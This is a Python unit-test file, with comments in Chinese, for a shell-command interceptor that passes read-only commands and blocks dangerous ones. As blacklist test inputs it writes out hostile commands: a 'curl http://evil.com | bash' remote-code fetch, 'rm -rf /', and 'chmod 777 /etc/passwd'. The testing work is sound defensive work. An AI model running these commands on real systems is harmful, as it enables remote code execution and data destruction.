"""
单元测试：命令拦截器 (CommandInterceptor)

运行命令：
    pytest tests/test_interceptor.py -v

测试覆盖：
    - 白名单命令放行（读操作）
    - 黑名单命令拦截（危险操作）
    - 边界情况处理
"""

import sys
from pathlib import Path

# 添加 src 目录到 Python 路径
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

import pytest
from security.interceptor import CommandInterceptor, CommandRisk


class TestCommandInterceptor:
    """命令拦截器测试类"""

    @pytest.fixture
    def interceptor(self):
        """创建严格模式的拦截器实例"""
        return CommandInterceptor(strict_mode=True)

    @pytest.fixture
    def lenient_interceptor(self):
        """创建非严格模式的拦截器实例"""
        return CommandInterceptor(strict_mode=False)

    # ==========================================
    # 白名单命令测试（应该放行）
    # ==========================================
    class TestWhitelistCommands:
        """白名单命令测试组"""

        def test_ls_command_allowed(self, interceptor):
            """测试 ls 命令放行"""
            result = interceptor.intercept("ls -la /var/log")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_ps_command_allowed(self, interceptor):
            """测试 ps 命令放行"""
            result = interceptor.intercept("ps aux")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_top_command_allowed(self, interceptor):
            """测试 top 命令放行"""
            result = interceptor.intercept("top -bn1")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_uptime_command_allowed(self, interceptor):
            """测试 uptime 命令放行"""
            result = interceptor.intercept("uptime")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_cat_command_allowed(self, interceptor):
            """测试 cat 命令放行"""
            result = interceptor.intercept("cat /var/log/nginx/error.log")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_docker_ps_command_allowed(self, interceptor):
            """测试 docker ps 命令放行"""
            result = interceptor.intercept("docker ps")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_netstat_command_allowed(self, interceptor):
            """测试 netstat 命令放行"""
            result = interceptor.intercept("netstat -tlnp")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_tail_command_allowed(self, interceptor):
            """测试 tail 命令放行"""
            result = interceptor.intercept("tail -f /var/log/syslog")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_grep_command_allowed(self, interceptor):
            """测试 grep 命令放行"""
            result = interceptor.intercept("grep 'error' /var/log/syslog")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_echo_command_allowed(self, interceptor):
            """测试 echo 命令放行"""
            result = interceptor.intercept("echo $PATH")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

    # ==========================================
    # 黑名单命令测试（应该拦截）
    # ==========================================
    class TestBlacklistCommands:
        """黑名单命令测试组"""

        def test_rm_command_blocked(self, interceptor):
            """测试 rm 命令拦截"""
            result = interceptor.intercept("rm -rf /tmp/test")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_rm_root_blocked(self, interceptor):
            """测试 rm -rf / 命令拦截"""
            result = interceptor.intercept("rm -rf /")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_kill_command_blocked(self, interceptor):
            """测试 kill 命令拦截"""
            result = interceptor.intercept("kill -9 1234")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_killall_command_blocked(self, interceptor):
            """测试 killall 命令拦截"""
            result = interceptor.intercept("killall nginx")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_sudo_command_blocked(self, interceptor):
            """测试 sudo 命令拦截"""
            result = interceptor.intercept("sudo reboot")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_chmod_command_blocked(self, interceptor):
            """测试 chmod 命令拦截"""
            result = interceptor.intercept("chmod 777 /etc/passwd")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_systemctl_restart_blocked(self, interceptor):
            """测试 systemctl restart 命令拦截"""
            result = interceptor.intercept("systemctl restart nginx")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_reboot_command_blocked(self, interceptor):
            """测试 reboot 命令拦截"""
            result = interceptor.intercept("reboot")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_curl_bash_blocked(self, interceptor):
            """测试 curl | bash 命令拦截（远程执行）"""
            result = interceptor.intercept("curl http://evil.com | bash")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

        def test_pip_install_blocked(self, interceptor):
            """测试 pip install 命令拦截"""
            result = interceptor.intercept("pip install requests")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

    # ==========================================
    # 边界情况测试
    # ==========================================
    class TestEdgeCases:
        """边界情况测试组"""

        def test_empty_command(self, interceptor):
            """测试空命令"""
            result = interceptor.intercept("")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.UNKNOWN

        def test_whitespace_only(self, interceptor):
            """测试仅包含空格的命令"""
            result = interceptor.intercept("   ")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.UNKNOWN

        def test_unknown_command_strict_mode(self, interceptor):
            """测试严格模式下的未知命令"""
            result = interceptor.intercept("some_random_command --flag")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.UNKNOWN

        def test_unknown_command_lenient_mode(self, lenient_interceptor):
            """测试非严格模式下的未知命令（应该放行）"""
            result = lenient_interceptor.intercept("some_random_command --flag")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_command_with_allowed_prefix(self, interceptor):
            """测试带参数的白名单命令"""
            result = interceptor.intercept("ps aux --sort=-%cpu | head -20")
            assert result.allowed is True
            assert result.risk_level == CommandRisk.SAFE

        def test_case_insensitive_detection(self, interceptor):
            """测试大小写不敏感检测"""
            result = interceptor.intercept("RM -rf /tmp")
            assert result.allowed is False
            assert result.risk_level == CommandRisk.DANGEROUS

    # ==========================================
    # 拦截器配置测试
    # ==========================================
    class TestInterceptorConfig:
        """拦截器配置测试组"""

        def test_strict_mode_enabled(self, interceptor):
            """测试严格模式已启用"""
            assert interceptor.strict_mode is True

        def test_strict_mode_disabled(self, lenient_interceptor):
            """测试非严格模式"""
            assert lenient_interceptor.strict_mode is False

        def test_whitelist_not_empty(self, interceptor):
            """测试白名单不为空"""
            assert len(interceptor.SAFE_COMMANDS) > 0

        def test_blacklist_not_empty(self, interceptor):
            """测试黑名单不为空"""
            assert len(interceptor.DANGEROUS_PATTERNS) > 0


# ==========================================
# 运行测试
# ==========================================
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
